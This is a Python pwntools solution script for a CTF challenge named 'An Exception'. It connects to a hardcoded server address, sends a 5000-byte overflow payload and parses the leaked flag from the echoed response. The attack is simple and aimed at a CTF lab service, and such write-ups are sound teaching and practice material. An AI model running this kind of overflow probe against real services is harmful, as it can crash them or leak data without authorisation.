#!/usr/bin/env python3
"""
Solution for "An Exception" CTF Challenge
UCL/KCL CTF

The challenge involves connecting to a server that echoes back user input.
The vulnerability is a buffer overflow - when you send a very long input string
(~5000 characters), the flag is leaked at the end of the response.

The challenge name "An Exception" was a red herring - while empty input does
trigger an IndexError (from trying to access .split()[0] on empty input),
the actual exploit involves buffer overflow, not exception handling.
"""

from pwn import *

def solve():
    # Connect to the server
    r = remote('13.61.183.242', 9001)

    # Receive the prompt
    r.recvuntil(b': ')

    # Send a long payload to trigger buffer overflow
    payload = b'A' * 5000
    r.sendline(payload)

    # Receive the response
    response = r.recvall(timeout=10)

    # Extract the flag from the response
    # The flag appears at the end after the echoed input
    if b'flag{' in response:
        # Find the flag
        start = response.find(b'flag{')
        end = response.find(b'}', start) + 1
        flag = response[start:end].decode()
        print(f"[+] FLAG FOUND: {flag}")
    else:
        print("[-] Flag not found in response")
        print(f"Response: {response}")

    r.close()
    return response

if __name__ == "__main__":
    solve()
